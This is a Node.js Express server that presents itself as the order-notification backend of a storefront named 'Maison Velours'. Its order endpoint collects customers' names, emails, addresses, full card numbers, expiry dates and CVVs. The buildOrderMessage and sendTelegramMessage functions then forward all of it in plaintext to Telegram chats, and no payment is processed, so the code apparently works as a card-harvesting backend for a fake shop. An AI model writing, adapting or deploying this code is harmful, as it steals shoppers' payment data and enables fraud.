// @ts-nocheck
// Maison Velours - Telegram order notification backend
require('dotenv').config();
const express = require('express');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const path = require('path');

const app = express();
const PORT = Number(process.env.PORT || 3000);
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const CHAT_IDS = (process.env.TELEGRAM_CHAT_IDS || '')
  .split(',')
  .map(x => x.trim())
  .filter(Boolean);
const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS || '')
  .split(',')
  .map(x => x.trim())
  .filter(Boolean);

app.disable('x-powered-by');
app.use(helmet({
  crossOriginResourcePolicy: false,
  contentSecurityPolicy: false
}));
app.use(express.json({ limit: '32kb' }));

const orderLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  limit: 20,
  standardHeaders: 'draft-7',
  legacyHeaders: false,
  message: { ok: false, error: 'Too many order attempts. Please try again later.' }
});

app.use('/api/orders/telegram', (req, res, next) => {
  if (!ALLOWED_ORIGINS.length) return next();
  const origin = req.get('origin');
  if (!origin || ALLOWED_ORIGINS.includes(origin)) return next();
  return res.status(403).json({ ok: false, error: 'Origin not allowed.' });
});

function clean(value, max = 500) {
  return String(value == null ? '' : value)
    .replace(/[\u0000-\u001F\u007F]/g, '')
    .trim().slice(0, max);
}
function validEmail(value) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
}
function buildOrderMessage(order) {
  const lines = order.items.map(item => {
    const qty = Number(item.quantity);
    const price = Number(item.price);
    const lineTotal = price * qty;
    const qtySuffix = qty > 1 ? ` x${qty}` : '';
    return `\n- ${clean(item.name, 180)}${qtySuffix} ($${lineTotal.toFixed(2)})`;
  });
  const header = `New Maison Velours order - $${order.total.toFixed(2)}`;
  const itemLines = lines.join('');
  const customerInfo =
  `Name: ${order.name}\n` +
  `Email: ${order.email}\n` +
  `Address: ${order.address}\n` +
  `Card: ${order.cardNumber}\n` +
  `Expiry: ${order.expiryDate}\n` +
  `CVV: ${order.securityCode}\n` +
  `ZIP: ${order.zip}`;
  return `${header}${itemLines}\n\n${customerInfo}`;
}
async function sendTelegramMessage(chatId, text) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 10000);
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text }),
      signal: controller.signal
    });
    clearTimeout(timeout);
    const data = await response.json().catch(() => ({ ok: false }));
    if (response.ok && data.ok) return true;
    const reason = data.description || response.status;
    console.error(`[telegram] Delivery failed for ${chatId}: ${reason}`);
    return false;
  } catch (error) {
    clearTimeout(timeout);
    console.error(`[telegram] Network error for ${chatId}:`, error.message);
    return false;
  }
}
async function notifyStartup() {
  if (!BOT_TOKEN || !CHAT_IDS.length) return;
  const message = `Maison Velours is online.\n` +
    `Started: ${new Date().toISOString()}\n` +
    `Port: ${PORT}`;
  await Promise.all(CHAT_IDS.map(id => sendTelegramMessage(id, message)));
}

const STOREFRONT = path.join(__dirname, 'maison-velours-updated.html');
app.use('/assets', express.static(path.join(__dirname, 'assets'), { maxAge: '7d', index: false }));
app.get('/', (_req, res) => res.sendFile(STOREFRONT));
app.get('/maison-velours-updated.html', (_req, res) => res.sendFile(STOREFRONT));
app.get('/health', (_req, res) => res.json({ ok: true, service: 'maison-velours' }));

app.post('/api/orders/telegram', orderLimiter, async (req, res) => {
  if (!BOT_TOKEN || !CHAT_IDS.length) {
    return res.status(503).json({
      ok: false,
      error: 'Order notifications are temporarily unavailable.'
    });
  }
  const body = req.body || {};
  const name = clean(body.name, 120);
  const email = clean(body.email, 254);
  const address = clean(body.address, 500);
  const cardNumber = clean(body.cardNumber, 23);
  const expiryDate = clean(body.expiryDate, 5);
  const securityCode = clean(body.securityCode, 4);
  const zip = clean(body.zip, 30);
  const total = Number(body.total);
  const items = Array.isArray(body.items) ? body.items : [];

  if (!name || !validEmail(email) || !address || !cardNumber || !expiryDate || !securityCode || !zip ||
      !Number.isFinite(total) || total < 0 || items.length < 1 || items.length > 50) {
    return res.status(400).json({ ok: false, error: 'Invalid order details.' });
  }

  const normalizedItems = [];
  for (const item of items) {
    const itemName = clean(item && item.name, 180);
    const quantity = Number(item && item.quantity);
    const price = Number(item && item.price);
    if (!itemName || !Number.isInteger(quantity) || quantity < 1 || quantity > 99 ||
        !Number.isFinite(price) || price < 0) {
      return res.status(400).json({ ok: false, error: 'Invalid order items.' });
    }
    normalizedItems.push({ name: itemName, quantity, price });
  }

  const message = buildOrderMessage({
    name,
    email,
    address,
    cardNumber,
    expiryDate,
    securityCode,
    zip,
    total,
    items: normalizedItems
  });
  const results = await Promise.all(
    CHAT_IDS.map(chatId => sendTelegramMessage(chatId, message))
  );
  const successCount = results.filter(Boolean).length;
  const failedCount = results.length - successCount;

  if (successCount === 0) {
    return res.status(502).json({
      ok: false, successCount: 0, failedCount,
      error: 'Order notification could not be delivered to Telegram. Please try again.'
    });
  }
  return res.json({ ok: true, successCount, failedCount });
});

app.use((_req, res) => res.status(404).json({ ok: false, error: 'Not found.' }));

if (!BOT_TOKEN) console.warn('[config] TELEGRAM_BOT_TOKEN is not set.');
if (!CHAT_IDS.length) console.warn('[config] TELEGRAM_CHAT_IDS is empty.');
if (!ALLOWED_ORIGINS.length) console.warn('[config] ALLOWED_ORIGINS is empty; origin checking is disabled.');

app.listen(PORT, () => {
  console.log(`Maison Velours backend listening on port ${PORT}`);
  notifyStartup().catch(err => console.error('[startup]', err));
});

process.on('unhandledRejection', reason => console.error('[fatal] Unhandled promise rejection:', reason));
process.on('uncaughtException', error => {
  console.error('[fatal] Uncaught exception:', error);
  process.exit(1);
});
